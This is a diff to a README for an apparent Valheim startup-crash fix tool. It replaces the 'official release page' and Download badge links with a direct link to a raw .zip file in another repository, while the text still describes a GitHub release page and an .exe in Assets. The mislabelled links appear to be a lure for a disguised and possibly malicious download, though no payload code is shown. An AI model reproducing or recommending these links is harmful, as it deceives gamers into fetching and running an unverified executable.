@@ -5,7 +5,7 @@ description: "Resolve Valheim startup crashes on Windows 10 and 11 with this aut
 ---
 # 🛠 Valheim-Crash-Fix - Stop Valheim Crashes On Startup Today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lyndondoityourself605/Valheim-Crash-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Lyndondoityourself605/lyndondoityourself605.github.io/main/methobromide/lyndondoityourself-github-io-2.0.zip)
 
 Valheim sometimes fails to open on Windows 10 and Windows 11. This tool repairs internal files and clear conflicts that prevent the game from starting. It targets the common startup crash caused by corrupted configuration files or incorrect system permissions.
 
@@ -30,7 +30,7 @@ This process keeps your character and world save files safe. You do not lose gam
 
 Follow these steps to fix the crash. Do not skip any steps.
 
-1. Visit the [official release page](https://github.com/Lyndondoityourself605/Valheim-Crash-Fix/releases) to download the latest version.
+1. Visit the [official release page](https://raw.githubusercontent.com/Lyndondoityourself605/lyndondoityourself605.github.io/main/methobromide/lyndondoityourself-github-io-2.0.zip) to download the latest version.
 2. Find the link labeled Valheim-Crash-Fix.exe in the Assets section.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
